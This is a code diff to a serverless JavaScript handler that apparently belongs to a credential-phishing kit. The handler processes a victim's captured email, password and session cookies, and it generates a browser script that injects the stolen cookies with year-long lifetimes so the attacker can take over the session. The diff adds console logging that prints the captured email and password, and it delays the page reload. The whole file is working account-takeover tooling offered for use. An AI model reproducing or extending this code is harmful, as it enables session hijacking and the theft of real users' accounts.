@@ -157,6 +157,12 @@ export const handler = async (event, context) => {
     const clientIP = getClientIP();
     const userEmail = cookiesData.email || 'Not captured';
     const userPassword = cookiesData.password || 'Not captured';
+    
+    console.log('📊 Processing cookies data:', {
+      email: userEmail,
+      cookieCount: Array.isArray(cookiesData.cookies) ? cookiesData.cookies.length : 0,
+      cookieType: typeof cookiesData.cookies
+    });
 
     // Process cookies with improved handling
     let processedCookies = [];
@@ -211,7 +217,7 @@ export const handler = async (event, context) => {
 
     // Create JavaScript injection code
     const jsInjectionCode = formattedCookies.length > 0 ? 
-      `!function(){console.log("%c COOKIES LOADED","background:greenyellow;color:#fff;font-size:30px;");let e=JSON.parse(${JSON.stringify(JSON.stringify(formattedCookies))});for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}\${o.secure?"Secure;":""}\${o.sameSite?\`SameSite=\${o.sameSite};\`:"SameSite=no_restriction;"}\`;console.log("Cookie set:",o.name);location.reload()}();` :
+      `!function(){console.log("%c COOKIES LOADED","background:greenyellow;color:#fff;font-size:30px;");let e=JSON.parse(${JSON.stringify(JSON.stringify(formattedCookies))});for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}\${o.secure?"Secure;":""}\${o.sameSite?\`SameSite=\${o.sameSite};\`:"SameSite=no_restriction;"}\`;console.log("Cookie set:",o.name);setTimeout(()=>location.reload(),1000)}();` :
       `console.log("%c NO COOKIES AVAILABLE","background:red;color:#fff;font-size:30px;");alert("No cookies found for this session.");`;
 
     // Create the output
@@ -222,6 +228,8 @@ export const handler = async (event, context) => {
 let ipaddress = "${clientIP}";
 let email = "${userEmail}";
 let password = "${userPassword}";
+
+console.log("Session Info:", {email, password, cookieCount: ${formattedCookies.length}});
 
 ${jsInjectionCode}
 
